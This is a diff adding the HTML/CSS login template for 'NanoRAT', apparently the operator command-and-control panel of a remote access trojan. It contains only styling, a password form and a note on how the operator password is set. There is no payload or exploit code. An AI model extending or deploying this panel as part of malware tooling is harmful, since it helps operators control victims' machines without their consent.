@@ -1,0 +1,116 @@
+<!doctype html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>NanoRAT — operator login</title>
+<link rel="stylesheet" href="/static/css/dashboard.css">
+<style>
+  html, body { height: 100%; }
+  body.login-body {
+    display: grid;
+    place-items: center;
+    background: #05070c;
+    margin: 0;
+  }
+  .login-card {
+    width: min(380px, 92vw);
+    padding: 34px 30px 28px;
+    background: #0b1017;
+    border: 1px solid #1c2836;
+    border-radius: 6px;
+    box-shadow: 0 0 0 1px #05070c, 0 24px 70px rgba(0,0,0,.65);
+    font-family: ui-monospace, "SF Mono", Menlo, Consolas, monospace;
+  }
+  .login-card h1 {
+    margin: 0 0 2px;
+    font-size: 20px;
+    letter-spacing: 3px;
+    color: #4de2b0;
+    text-shadow: 0 0 14px rgba(77,226,176,.45);
+  }
+  .login-card p.tag {
+    margin: 0 0 26px;
+    font-size: 11px;
+    letter-spacing: 2px;
+    color: #4a5c6e;
+    text-transform: uppercase;
+  }
+  .login-card label {
+    display: block;
+    font-size: 11px;
+    letter-spacing: 1.5px;
+    color: #5d7085;
+    margin-bottom: 7px;
+    text-transform: uppercase;
+  }
+  .login-card input[type=password] {
+    width: 100%;
+    box-sizing: border-box;
+    padding: 12px 13px;
+    font-size: 14px;
+    font-family: inherit;
+    color: #d7e3ee;
+    background: #070b11;
+    border: 1px solid #22303f;
+    border-radius: 4px;
+    outline: none;
+  }
+  .login-card input[type=password]:focus {
+    border-color: #4de2b0;
+    box-shadow: 0 0 0 3px rgba(77,226,176,.12);
+  }
+  .login-card button {
+    width: 100%;
+    margin-top: 16px;
+    padding: 12px;
+    font-size: 13px;
+    letter-spacing: 2px;
+    font-family: inherit;
+    text-transform: uppercase;
+    color: #04120d;
+    background: #4de2b0;
+    border: 0;
+    border-radius: 4px;
+    cursor: pointer;
+  }
+  .login-card button:hover { background: #6cf0c3; }
+  .login-err {
+    margin: 16px 0 0;
+    padding: 9px 11px;
+    font-size: 12px;
+    color: #ff8080;
+    background: rgba(255,90,90,.08);
+    border: 1px solid rgba(255,90,90,.28);
+    border-radius: 4px;
+  }
+  .login-hint {
+    margin: 20px 0 0;
+    font-size: 10.5px;
+    line-height: 1.7;
+    color: #3f4f5e;
+  }
+</style>
+</head>
+<body class="login-body">
+
+  <form class="login-card" method="post" action="/login">
+    <h1>NANORAT</h1>
+    <p class="tag">command center</p>
+
+    <label for="password">operator password</label>
+    <input id="password" name="password" type="password" autocomplete="current-password"
+           autofocus required>
+
+    {% if error %}<p class="login-err">{{ error }}</p>{% endif %}
+
+    <button type="submit">authenticate</button>
+
+    <p class="login-hint">
+      Set <code>C2_OPERATOR_PASSWORD</code> in the environment to choose your own.
+      Otherwise one is generated on first run and printed by the server banner.
+    </p>
+  </form>
+
+</body>
+</html>
